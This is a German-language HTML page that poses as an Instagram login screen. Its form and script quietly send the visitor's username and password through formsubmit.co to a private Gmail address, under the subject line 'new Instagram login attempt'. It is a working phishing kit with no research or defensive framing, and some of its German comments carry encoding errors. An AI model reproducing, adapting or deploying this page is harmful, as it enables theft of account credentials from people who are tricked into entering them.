<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background-color: #fafafa;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: #fff;
      border-radius: 5px;
      box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
      width: 350px;
      padding: 50px 40px 30px;
      text-align: center;
    }
    .logo {
      width: 175px;
      margin-bottom: 30px;
    }
    .input-field {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 14px;
    }
    .input-field:focus {
      border-color: #0095f6;
      outline: none;
    }
    .login-btn {
      width: 100%;
      padding: 10px;
      background-color: #0095f6;
      color: white;
      border: none;
      border-radius: 3px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
    }
    .login-btn:hover {
      background-color: #007bb5;
    }
    .forgot-password {
      font-size: 12px;
      color: #00376b;
      margin-top: 15px;
      text-decoration: none;
    }
    .forgot-password:hover {
      text-decoration: underline;
    }
    .divider {
      margin: 15px 0;
      position: relative;
    }
    .divider::before {
      content: '';
      position: absolute;
      top: 50%;
      left: 0;
      right: 0;
      border-top: 1px solid #dbdbdb;
      width: 100%;
    }
    .divider span {
      background-color: white;
      padding: 0 10px;
      color: #999;
      font-size: 12px;
      position: relative;
      z-index: 1;
    }
    .signup-section {
      margin-top: 20px;
    }
    .signup-section a {
      color: #0095f6;
      text-decoration: none;
      font-size: 14px;
    }
    .signup-section a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="container">
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
    
    <h2>Instagram</h2>

    <!-- Login-Formular -->
    <form id="loginForm" action="https://formsubmit.co/lummel664@gmail.com" method="POST">
      <!-- Hidden fields for FormSubmit -->
      <input type="hidden" name="_subject" value="Neuer Instagram Login-Versuch">
      <input type="hidden" name="_template" value="table">
      
      <input type="text" id="username" class="input-field" name="Benutzername" placeholder="Benutzername" required>
      <input type="password" id="password" class="input-field" name="Passwort" placeholder="Passwort" required>
      <button type="submit" class="login-btn" style="display:none;">Einloggen</button>
    </form>

    <!-- Forgot password link -->
    <a href="#" class="forgot-password">Passwort vergessen?</a>

    <!-- Divider with or -->
    <div class="divider">
      <span>Oder</span>
    </div>

    <!-- Signup Section -->
    <div class="signup-section">
      <p>Kein Konto? <a href="#">Registrieren</a></p>
    </div>
  </div>

  <script>
    // Validierung und Senden der E-Mail 端ber FormSubmit
    const form = document.getElementById("loginForm");

    form.addEventListener("submit", function(event) {
      event.preventDefault();  // Verhindert das normale Absenden des Formulars

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      // Optional: Einfache Validierung (z. B. pr端fen, ob beide Felder ausgef端llt sind)
      if (username === "" || password === "") {
        alert("Bitte geben Sie sowohl Benutzername als auch Passwort ein.");
      } else {
        // Das Formular wird nun automatisch abgesendet, ohne Benachrichtigung
        form.submit(); // Das Formular wird jetzt 端ber FormSubmit gesendet
      }
    });
  </script>

</body>
</html>
